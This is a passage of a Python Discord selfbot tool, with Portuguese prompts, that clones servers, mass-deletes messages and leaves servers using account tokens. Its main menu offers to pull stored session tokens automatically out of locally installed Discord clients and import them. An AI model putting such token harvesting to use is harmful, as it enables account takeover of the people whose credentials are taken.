            await patch_guild_image(
                "banner do servidor",
                "banner",
                f"https://cdn.discordapp.com/banners/{source_id}/{source_banner}.{ext}?size=1024",
                mime,
            )

        source_splash = source.get("splash")
        if source_splash:
            await patch_guild_image(
                "invite background",
                "splash",
                f"https://cdn.discordapp.com/splashes/{source_id}/{source_splash}.png?size=1024",
                "image/png",
            )

        source_discovery = source.get("discovery_splash")
        if source_discovery:
            await patch_guild_image(
                "discovery splash",
                "discovery_splash",
                f"https://cdn.discordapp.com/discovery-splashes/{source_id}/{source_discovery}.png?size=1024",
                "image/png",
            )
        mark_done("guild_settings")

    # 8.1. Clonar stickers
    cloned_stickers = 0
    if "stickers" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Stickers ja foram processados.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando stickers...")
        try:
            source_stickers = await r_get(f"/guilds/{source_id}/stickers")
            created_sticker_ids = set(progress.get("created_sticker_ids", []))
            sticker_ext = {1: "png", 2: "png", 3: "json", 4: "gif"}
            sticker_mime = {1: "image/png", 2: "image/png", 3: "application/json", 4: "image/gif"}
            for sticker in source_stickers or []:
                if sticker.get("type") != 2:
                    continue
                sticker_id = sticker.get("id")
                sticker_name = sticker.get("name") or "sticker"
                if str(sticker_id) in created_sticker_ids:
                    cloned_stickers += 1
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Sticker ja clonado, pulando: {sticker_name}")
                    continue
                fmt = sticker.get("format_type", 1)
                ext = sticker_ext.get(fmt, "png")
                mime = sticker_mime.get(fmt, "image/png")
                file_url = f"https://cdn.discordapp.com/stickers/{sticker_id}.{ext}"
                file_bytes, _ = await download_bytes(file_url)
                if not file_bytes:
                    print(f"  [!] Falha ao baixar sticker: {sticker_name}")
                    continue

                form = aiohttp.FormData()
                form.add_field("name", sticker_name[:30])
                form.add_field("description", (sticker.get("description") or "")[:100])
                form.add_field("tags", sticker.get("tags") or sticker_name[:30])
                form.add_field("file", file_bytes, filename=f"{sticker_name}.{ext}", content_type=mime)
                new_sticker, status, message = await w_post_form_verbose(f"/guilds/{dest_id}/stickers", form)
                if new_sticker:
                    cloned_stickers += 1
                    created_sticker_ids.add(str(sticker_id))
                    progress["created_sticker_ids"] = sorted(created_sticker_ids)
                    save_progress()
                    print(f"  \033[92m*\033[0m Sticker criado: {sticker_name}")
                elif status == 400 and "maximum number of stickers" in (message or "").lower():
                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Limite de stickers do servidor atingido. Ignorando o restante dos stickers.")
                    break
                else:
                    detail = f" (HTTP {status}: {message})" if status else ""
                    print(f"  [!] Falha ao criar sticker: {sticker_name}{detail}")
                await asyncio.sleep(random.uniform(media_delay_min, media_delay_max))
            if not cloned_stickers:
                print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} Nenhum sticker clonado.")
            mark_done("stickers")
        except CloneRateLimitPause as e:
            await handle_media_rate_limit(e, "stickers")

    # 8.2. Clonar soundboards
    cloned_sounds = 0
    if "soundboards" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Soundboards ja foram processados.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando soundboards...")
        try:
            source_sounds_data = await r_get(f"/guilds/{source_id}/soundboard-sounds")
            source_sounds = []
            if isinstance(source_sounds_data, dict):
                source_sounds = source_sounds_data.get("items", [])
            elif isinstance(source_sounds_data, list):
                source_sounds = source_sounds_data
            created_sound_ids = set(progress.get("created_sound_ids", []))

            for sound in source_sounds:
                sound_id = sound.get("sound_id")
                sound_name = sound.get("name") or "sound"
                if not sound_id:
                    continue
                if str(sound_id) in created_sound_ids:
                    cloned_sounds += 1
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Soundboard ja clonado, pulando: {sound_name}")
                    continue
                sound_data = await download_data_uri(
                    f"https://cdn.discordapp.com/soundboard-sounds/{sound_id}",
                    "audio/mpeg",
                )
                if not sound_data:
                    print(f"  [!] Falha ao baixar soundboard: {sound_name}")
                    continue

                sound_payload = {
                    "name": sound_name[:32],
                    "sound": sound_data,
                    "volume": sound.get("volume", 1.0),
                }
                if sound.get("emoji_id") and emoji_map.get(str(sound.get("emoji_id"))):
                    sound_payload["emoji_id"] = emoji_map[str(sound.get("emoji_id"))]
                elif sound.get("emoji_name"):
                    sound_payload["emoji_name"] = sound.get("emoji_name")

                new_sound = await w_post(f"/guilds/{dest_id}/soundboard-sounds", sound_payload)
                if new_sound:
                    cloned_sounds += 1
                    created_sound_ids.add(str(sound_id))
                    progress["created_sound_ids"] = sorted(created_sound_ids)
                    save_progress()
                    print(f"  \033[92m*\033[0m Soundboard criado: {sound_name}")
                else:
                    print(f"  [!] Falha ao criar soundboard: {sound_name}")
                await asyncio.sleep(random.uniform(media_delay_min, media_delay_max))
            if not cloned_sounds:
                print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} Nenhum soundboard clonado.")
            mark_done("soundboards")
        except CloneRateLimitPause as e:
            await handle_media_rate_limit(e, "soundboards")

    # 8.3. Clonar AutoMod
    cloned_automod = 0
    if "automod" in completed_steps:
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} AutoMod ja foi processado.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Clonando AutoMod...")
        source_automod_rules = await r_get(f"/guilds/{source_id}/auto-moderation/rules")
        created_automod_names = set(progress.get("created_automod_names", []))
    if "automod" not in completed_steps and source_automod_rules:
        dest_automod_rules = await w_get(f"/guilds/{dest_id}/auto-moderation/rules")
        if dest_automod_rules and not created_automod_names:
            for rule in dest_automod_rules:
                await w_delete(f"/guilds/{dest_id}/auto-moderation/rules/{rule['id']}")
                await asyncio.sleep(random.uniform(delay_min, delay_max))

        for rule in source_automod_rules:
            rule_name = rule.get("name", "AutoMod")
            if rule_name in created_automod_names:
                cloned_automod += 1
                print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} AutoMod ja clonado, pulando: {rule_name}")
                continue
            actions = []
            for action in rule.get("actions", []):
                action_copy = {
                    "type": action.get("type"),
                    "metadata": dict(action.get("metadata") or {}),
                }
                channel_id = action_copy["metadata"].get("channel_id")
                mapped_channel = map_channel_id(channel_id)
                if channel_id and mapped_channel:
                    action_copy["metadata"]["channel_id"] = mapped_channel
                elif channel_id and not mapped_channel:
                    if action_copy["type"] == 2:
                        continue
                    action_copy["metadata"].pop("channel_id", None)
                actions.append(action_copy)

            automod_payload = {
                "name": rule_name,
                "event_type": rule.get("event_type"),
                "trigger_type": rule.get("trigger_type"),
                "trigger_metadata": rule.get("trigger_metadata") or {},
                "actions": actions,
                "enabled": rule.get("enabled", False),
                "exempt_roles": map_roles(rule.get("exempt_roles", [])),
                "exempt_channels": [cid for cid in (map_channel_id(c) for c in rule.get("exempt_channels", [])) if cid],
            }
            new_rule = await w_post(f"/guilds/{dest_id}/auto-moderation/rules", automod_payload)
            if new_rule:
                cloned_automod += 1
                created_automod_names.add(rule_name)
                progress["created_automod_names"] = sorted(created_automod_names)
                save_progress()
                print(f"  \033[92m*\033[0m AutoMod criado: {rule_name}")
            else:
                print(f"  [!] Falha ao criar AutoMod: {rule_name}")
            await asyncio.sleep(random.uniform(delay_min, delay_max))
        if not cloned_automod:
            print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} Nenhuma regra AutoMod clonada ou sem permissao para ler/criar.")
        mark_done("automod")
    elif "automod" not in completed_steps:
        print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} Nenhuma regra AutoMod clonada ou sem permissao para ler/criar.")
        mark_done("automod")

    # 9. Clonar Server Tag (Clan)
    if progress.get("server_tag_done"):
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Server Tag ja foi processada.")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Verificando Server Tag...")
        clan_data = await r_get(f"/guilds/{source_id}/clan")
    if not progress.get("server_tag_done") and clan_data and clan_data.get("tag"):
        tag_payload = {
            "tag": clan_data.get("tag", ""),
            "badge": clan_data.get("badge", 0),
            "badge_color_primary": clan_data.get("badge_color_primary", ""),
            "badge_color_secondary": clan_data.get("badge_color_secondary", ""),
            "brand_color_primary": clan_data.get("brand_color_primary", ""),
            "brand_color_secondary": clan_data.get("brand_color_secondary", ""),
            "play_style": clan_data.get("play_style", 0),
            "description": clan_data.get("description", ""),
            "wildcard_descriptors": clan_data.get("wildcard_descriptors", []),
            "search_terms": clan_data.get("search_terms", []),
            "game_ids": clan_data.get("game_ids", []),
        }
        # Banner do clan
        clan_banner = clan_data.get("banner")
        if clan_banner:
            cb_url = f"https://cdn.discordapp.com/clan-banners/{source_id}/{clan_banner}.png?size=1024"
            try:
                async with r_session.get(cb_url) as resp:
                    if resp.status == 200:
                        img = await resp.read()
                        b64 = base64.b64encode(img).decode("utf-8")
                        tag_payload["banner"] = f"data:image/png;base64,{b64}"
            except Exception:
                pass

        # Tenta aplicar a tag no destino
        url = f"{API_BASE}/guilds/{dest_id}/clan"
        try:
            async with w_session.put(url, headers=w_headers(w_token), json=tag_payload) as resp:
                if resp.status in (200, 201, 204):
                    print(f"  \033[92m*\033[0m Server Tag clonada: {clan_data.get('tag')}")
                else:
                    err_text = ""
                    try:
                        err = await resp.json()
                        err_text = err.get("message", "")
                    except Exception:
                        pass
                    print(f"  [!] Falha ao clonar Server Tag (HTTP {resp.status}) {err_text}")
        except Exception as e:
            print(f"  [!] Erro ao clonar Server Tag: {e}")
        progress["server_tag_done"] = True
        save_progress()
    elif not progress.get("server_tag_done"):
        print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} Nao consegui ler Server Tag pelo endpoint usado (pode ser sem acesso, endpoint indisponivel ou origem sem tag).")
        progress["server_tag_done"] = True
        save_progress()

    emoji_result = "done"
    if emoji_task:
        if not emoji_task.done():
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Aguardando tarefa de emojis finalizar...")
        emoji_result = await emoji_task

    if emoji_result != "done":
        print(f"\n  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clone continuou, mas emojis ficaram pendentes por rate limit.")
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Progresso mantido. Depois retome pela opcao 9 para concluir emojis.")
        return True

    print(f"\n  \033[92m*\033[0m Clonagem concluida com sucesso!")
    print(f"  {BRANCO}Servidor '{source.get('name')}' -> clonado para '{dest.get('name')}'{NC}")
    _clear_clone_progress(source_id, dest_id, is_bot)
    return True


def main():
    enforce_mandatory_update()
    valid_tokens = get_tokens_from_config()

    if not valid_tokens:
        clear_screen()
        show_banner()
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum token configurado.\n")
        print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Colar token manualmente")
        print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Buscar tokens automaticamente (Discord instalado)\n")
        try:
            choice = input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Escolha: ").strip()
        except (EOFError, KeyboardInterrupt):
            sys.exit(0)

        if choice == "2":
            print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Escaneando instalacoes do Discord...")
            found = extract_tokens_from_discord()
            if found:
                print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} {len(found)} token(s) encontrado(s). Validando...\n")
                import_count = 0
                async def _initial_import():
                    nonlocal import_count
                    async with aiohttp.ClientSession() as session:
                        seen_ids = set()
                        for i, entry in enumerate(found, 1):
                            token = entry["token"]
                            source = entry["source"]
                            try:
                                async with session.get(
                                    f"{API_BASE}/users/@me",
                                    headers=get_headers(token, with_content_type=False)
                                ) as resp:
                                    if resp.status == 200:
                                        data = await resp.json()
                                        uid = data.get("id", "")
                                        uname = data.get("username", "")
                                        if uid in seen_ids:
                                            continue
                                        seen_ids.add(uid)
                                        add_token_to_config(token)
                                        update_username_in_config(token, uname)
                                        import_count += 1
                                        print(f"  \033[92m*\033[0m [{i}/{len(found)}] {source}: {BRANCO}{uname}{NC} -> importado!")
                                    else:
                                        print(f"  {c.R}[x]{c.X} [{i}/{len(found)}] {source}: invalido (HTTP {resp.status})")
                            except Exception as e:
                                print(f"  {c.R}[x]{c.X} [{i}/{len(found)}] {source}: erro -> {e}")
                            await asyncio.sleep(0.5)
                asyncio.run(_initial_import())
                if import_count > 0:
                    print(f"\n  \033[92m*\033[0m {import_count} conta(s) importada(s)! Conectando...\n")
                    valid_tokens = get_tokens_from_config()
                else:
                    print(f"\n  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum token valido encontrado.")
                    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Cole um token manualmente:\n")
                    try:
                        token = input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Cole o token: ").strip()
                    except (EOFError, KeyboardInterrupt):
                        sys.exit(0)
                    if not token:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token vazio, saindo.")
                        sys.exit(1)
                    add_token_to_config(token)
                    valid_tokens = [token]
                    print(f"  \033[92m*\033[0m Token adicionado! Conectando...\n")
            else:
                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum token encontrado nos Discord instalados.")
                print(f"  {AZUL}  Certifique-se de que o Discord esta instalado e logado.{NC}\n")
                print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Cole um token manualmente:\n")
                try:
                    token = input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Cole o token: ").strip()
                except (EOFError, KeyboardInterrupt):
                    sys.exit(0)
                if not token:
                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token vazio, saindo.")
                    sys.exit(1)
                add_token_to_config(token)
                valid_tokens = [token]
                print(f"  \033[92m*\033[0m Token adicionado! Conectando...\n")
        else:
            try:
                token = input(f"\n  {BRANCO}[{AZUL}{BRANCO}]{NC} Cole o token: ").strip()
            except (EOFError, KeyboardInterrupt):
                sys.exit(0)
            if not token:
                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token vazio, saindo.")
                sys.exit(1)
            add_token_to_config(token)
            valid_tokens = [token]
            print(f"  \033[92m*\033[0m Token adicionado! Conectando...\n")

    async def prompt_input(prompt_text: str) -> str:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, input, _fix_mojibake_text(prompt_text))

    async def wait_enter():
        await prompt_input(f"\n  {BRANCO}Pressione ENTER para voltar ao menu...{NC}")

    async def prompt_user_exclusions(action_label: str) -> set[str]:
        answer = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Deseja deixar alguem de fora {action_label}? (s/n): ")
        if not answer.strip().lower().startswith("s"):
            return set()

        raw_ids = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID(s) do usuario para deixar de fora (separe por virgula): ")
        ids = parse_comma_ids(raw_ids)
        if ids:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Usuario(s) mantido(s): {format_ids(ids)}")
        else:
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum ID valido informado. Continuando sem excecoes.")
        return ids

    async def prompt_friend_exclusions() -> set[str]:
        answer = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Deseja deixar alguem como amigo? (s/n): ")
        if not answer.strip().lower().startswith("s"):
            return set()

        raw_ids = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID(s) do usuario para manter como amigo (separe por virgula): ")
        ids = parse_comma_ids(raw_ids)
        if ids:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Amigo(s) mantido(s): {format_ids(ids)}")
        else:
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum ID valido informado. Continuando sem excecoes.")
        return ids

    async def prompt_server_exclusions() -> set[str]:
        answer = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Deseja deixar algum servidor? (s/n): ")
        if not answer.strip().lower().startswith("s"):
            return set()

        raw_ids = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID(s) do servidor para manter (separe por virgula): ")
        ids = parse_comma_ids(raw_ids)
        if ids:
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Servidor(es) mantido(s): {format_ids(ids)}")
        else:
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum ID valido informado. Continuando sem excecoes.")
        return ids

    async def choose_clone_resume(source_id: str, dest_id: str, is_bot: bool):
        progress = _load_clone_progress(source_id, dest_id, is_bot)
        if not progress:
            return False

        print()
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Existe um progresso anterior para esse clone.")
        print(f"  {BRANCO}Atualizado em:{NC} {progress.get('updated_at') or 'sem data'}")
        print(f"  {BRANCO}Etapas salvas:{NC} {len(progress.get('completed', []))}")
        print()
        print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Continuar de onde parou")
        print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Comecar do zero")
        print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Cancelar")
        resume_choice = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
        resume_choice = resume_choice.strip()

        if resume_choice == "1":
            return True
        if resume_choice == "2":
            return False
        return None

    async def choose_saved_clone_progress(saved_progresses: list[dict]) -> dict | None:
        if not saved_progresses:
            return None

        print()
        print(f"  {BRANCO}Progressos salvos:{NC}")
        for idx, item in enumerate(saved_progresses, 1):
            mode_label = "bot" if item.get("mode") == "bot" else "normal"
            updated = item.get("updated_at") or "sem data"
            completed = item.get("completed_count", 0)
            print(f"  {BRANCO}[{ROXO}{idx}{BRANCO}]{NC}  {mode_label} | origem {item['source_id']} -> destino {item['dest_id']} | {completed} etapa(s) | {updated}")
        print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Voltar")

        selected = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Progresso: ")
        selected = selected.strip()
        if selected == "0" or not selected:
            return None
        try:
            idx = int(selected) - 1
        except ValueError:
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Numero invalido.")
            await wait_enter()
            return None
        if idx < 0 or idx >= len(saved_progresses):
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Progresso inexistente.")
            await wait_enter()
            return None
        return saved_progresses[idx]

    async def ask_media_rate_limit_action(exc: CloneRateLimitPause, media_step: str) -> str:
        minutes = exc.retry_after / 60
        labels = {
            "emojis": "emojis",
            "stickers": "stickers",
            "soundboards": "soundboards",
        }
        label = labels.get(media_step, media_step)
        print()
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Rate limit longo ({minutes:.1f} min) em {label}.")
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Progresso salvo. O que deseja fazer?")
        print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Parar e retomar depois")
        print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Pular somente {label} e continuar")
        print(f"  {BRANCO}[{ROXO}3{BRANCO}]{NC}  Pular toda midia e continuar")
        action = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
        action = action.strip()
        if action == "2":
            return "skip"
        if action == "3":
            return "skip_all"
        return "stop"

    async def ask_clone_rate_limit_action(exc: CloneRateLimitPause) -> str:
        minutes = exc.retry_after / 60
        print()
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Rate limit elevado ({minutes:.1f} min) em {exc.path}.")
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Progresso salvo. Isso evita cair em rate limit muito longo.")
        print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Parar e retomar depois")
        print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Esperar agora e continuar")
        action = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
        return "wait" if action.strip() == "2" else "stop"

    async def run_clone_with_rate_limit(*args, **kwargs):
        while True:
            try:
                return await clone_server(*args, **kwargs)
            except CloneRateLimitPause as e:
                action = await ask_clone_rate_limit_action(e)
                if action != "wait":
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Retome depois pela opcao 9 escolhendo o progresso salvo.")
                    return False
                print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Esperando {e.retry_after:.2f}s antes de continuar...")
                await asyncio.sleep(e.retry_after + 0.5)
                kwargs["resume_progress"] = True

    async def terminal_input_loop(bots: list, all_tokens: list):
        # Mostra tela de loading enquanto conecta
        clear_screen()
        show_banner()
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Conectando ao Discord...\n")

        # Espera o bot estar logado
        while True:
            if bots and bots[0].user_id and bots[0].session:
                break
            await asyncio.sleep(1)

        bot = bots[0]

        while True:
            show_menu(bot.username, bot.user_id, 1, all_bots=bots)

            try:
                choice = await prompt_input(f"  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                choice = choice.strip()
            except (EOFError, KeyboardInterrupt):
                break

            if not choice:
                continue

            # Se multiplos bots, permite selecionar com "N:opcao"
            if len(bots) > 1 and len(choice) > 2 and choice[0].isdigit() and choice[1] == ':':
                idx = int(choice[0]) - 1
                if 0 <= idx < len(bots) and bots[idx].user_id:
                    bot = bots[idx]
                    choice = choice[2:].strip()
                else:
                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Conta {idx+1} nao disponAvel.")
                    await wait_enter()
                    continue

            if choice == "1":
                target = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do canal ou usuario: ")
                target = target.strip()
                if target:
                    channel_id = await bot.resolve_channel(target)
                    if channel_id:
                        await bot.purge_my_messages(channel_id)
                await wait_enter()

            elif choice == "2":
                try:
                    excluded_ids = await prompt_user_exclusions("da limpeza das DMs abertas")
                    await bot.purge_open_dms_only(excluded_ids)
                except Exception as e:
                    print(f"  [warn] cldms interrompido por erro inesperado: {e}")
                await wait_enter()

            elif choice == "3":
                excluded_ids = await prompt_user_exclusions("da limpeza de todas as DMs")
                await bot.purge_all_dms(excluded_ids)
                await wait_enter()

            elif choice == "4":
                try:
                    excluded_ids = await prompt_user_exclusions("da limpeza via Data Package")
                    await bot.purge_from_data_package(excluded_ids)
                except Exception as e:
                    print(f"  [warn] clfull interrompido por erro inesperado: {e}")
                await wait_enter()

            elif choice == "5":
                excluded_ids = await prompt_user_exclusions("do fechamento das DMs")
                await bot.close_all_dms(excluded_ids)
                await wait_enter()

            elif choice == "6":
                # Submenu: Farmcall
                while True:
                    clear_screen()
                    show_banner()
                    print(f"  {BRANCO}{'-' * 58}{NC}")
                    print(f"  {BRANCO}Farmcall{NC}")
                    print(f"  {BRANCO}{'-' * 58}{NC}")
                    print()
                    print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Entrar em canal de voz")
                    print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Sair do canal de voz")
                    print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Voltar")
                    print(f"  {AZUL}  {'-' * 52}{NC}")
                    fc_sub = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                    fc_sub = fc_sub.strip()

                    if fc_sub == "0" or not fc_sub:
                        break

                    if fc_sub == "2":
                        await bot.leave_voice_channel()
                        await wait_enter()
                        continue

                    if fc_sub == "1":
                        voice_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do canal de voz: ")
                        voice_id = voice_id.strip()
                        if not voice_id:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} ID vazio.")
                            await asyncio.sleep(1)
                            continue

                        mode = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Modo {BRANCO}(enter=normal, mute, deafen){NC}: ")
                        mode = mode.strip().lower()
                        self_mute = mode in ("mute", "deafen")
                        self_deaf = mode == "deafen"
                        await bot.join_voice_channel(voice_id, self_mute=self_mute, self_deaf=self_deaf)
                        await wait_enter()
                        continue

                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida.")
                    await asyncio.sleep(1)

            elif choice == "7":
                keep_server_ids = await prompt_server_exclusions()
                await bot.quit_all_servers(keep_server_ids)
                await wait_enter()

            elif choice == "8":
                keep_user_ids = await prompt_friend_exclusions()
                await bot.remove_all_friends(keep_user_ids)
                await wait_enter()

            elif choice == "9":
                # Server Clone (submenu)
                saved_clone = None
                saved_progresses = _list_clone_progresses()
                clear_screen()
                show_banner()
                print(f"  {BRANCO}{'-' * 58}{NC}")
                print(f"  {BRANCO}Server Clone{NC}")
                print(f"  {BRANCO}{'-' * 58}{NC}")
                print()
                if saved_progresses:
                    print(f"  {BRANCO}[{ROXO}3{BRANCO}]{NC}  Continuar progresso salvo")
                print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Clone com token normal")
                print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Clone via bot (mais rapido)")
                print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Voltar")
                print(f"  {AZUL}  {'-' * 52}{NC}")
                clone_mode = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                clone_mode = clone_mode.strip()

                if clone_mode == "0" or not clone_mode:
                    continue

                if clone_mode == "3" and saved_progresses:
                    saved_clone = await choose_saved_clone_progress(saved_progresses)
                    if not saved_clone:
                        continue
                    clone_mode = "2" if saved_clone.get("mode") == "bot" else "1"
                elif clone_mode not in ("1", "2"):
                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida.")
                    await wait_enter()
                    continue

                # IDs dos servidores (igual para ambos os modos)
                clear_screen()
                show_banner()
                print(f"  {BRANCO}{'-' * 58}{NC}")
                title = "Server Clone" if clone_mode == "1" else "Server Clone (Bot)"
                print(f"  {BRANCO}{title}{NC}")
                print(f"  {BRANCO}{'-' * 58}{NC}")
                print()

                if clone_mode == "2":
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Leitura com sua conta, escrita com token de bot")
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} O bot precisa estar no servidor de destino com Admin")
                    print()

                if saved_clone:
                    source_id = saved_clone["source_id"]
                    dest_id = saved_clone["dest_id"]
                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Usando progresso salvo:")
                    print(f"  {BRANCO}Origem:{NC}  {ROXO}{source_id}{NC}")
                    print(f"  {BRANCO}Destino:{NC} {ROXO}{dest_id}{NC}")
                    print()
                else:
                    source_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do servidor a ser clonado: ")
                    source_id = source_id.strip()
                    if not source_id:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} ID vazio.")
                        await wait_enter()
                        continue

                    dest_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do servidor de destino: ")
                    dest_id = dest_id.strip()
                    if not dest_id:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} ID vazio.")
                        await wait_enter()
                        continue

                if clone_mode == "1":
                    # Modo normal (token de usuario)
                    print()
                    print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Usar conta atual ({bot.username})")
                    print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Usar outra conta (token externo)")
                    acc_choice = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                    acc_choice = acc_choice.strip()

                    clone_token = None
                    clone_session = None

                    if acc_choice == "1":
                        clone_token = bot.token
                        clone_session = bot.session
                    elif acc_choice == "2":
                        ext_token = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Cole o token da conta para clonar: ")
                        ext_token = ext_token.strip()
                        if not ext_token:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token vazio.")
                            await wait_enter()
                            continue
                        clone_token = ext_token
                        clone_session = aiohttp.ClientSession()
                    else:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida.")
                        await wait_enter()
                        continue

                    print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Verificando servidores...")
                    source_info = await _clone_api_get(clone_session, clone_token, f"/guilds/{source_id}")
                    dest_info = await _clone_api_get(clone_session, clone_token, f"/guilds/{dest_id}")

                    if not source_info:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel acessar o servidor de origem (ID: {source_id}).")
                        if acc_choice == "2":
                            await clone_session.close()
                        await wait_enter()
                        continue
                    if not dest_info:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel acessar o servidor de destino (ID: {dest_id}).")
                        if acc_choice == "2":
                            await clone_session.close()
                        await wait_enter()
                        continue

                    source_name = source_info.get("name", "Desconhecido")
                    dest_name = dest_info.get("name", "Desconhecido")

                    print()
                    print(f"  \033[92m*\033[0m Servidores identificados!")
                    print(f"  {BRANCO}Origem:{NC}  {ROXO}{source_name}{NC} ({source_id})")
                    print(f"  {BRANCO}Destino:{NC} {ROXO}{dest_name}{NC} ({dest_id})")
                    resume_clone = True if saved_clone else await choose_clone_resume(source_id, dest_id, is_bot=False)
                    if resume_clone is None:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clonagem cancelada.")
                        if acc_choice == "2":
                            await clone_session.close()
                        await wait_enter()
                        continue
                    print()
                    if resume_clone:
